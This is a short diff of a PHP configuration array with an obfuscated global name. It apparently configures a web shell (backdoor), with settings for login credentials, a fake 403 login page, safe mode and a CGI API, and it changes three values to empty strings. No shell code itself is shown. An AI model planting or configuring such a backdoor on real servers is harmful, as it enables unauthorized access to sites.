@@ -8,9 +8,9 @@
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => '',
     'password' => '',
-    'safe_mode' => '0',
-    'login_page' => '403',
-    'show_icons' => '1',
+    'safe_mode' => '',
+    'login_page' => '',
+    'show_icons' => '',
     'post_encryption' => false,
     'cgi_api' => true,
 );
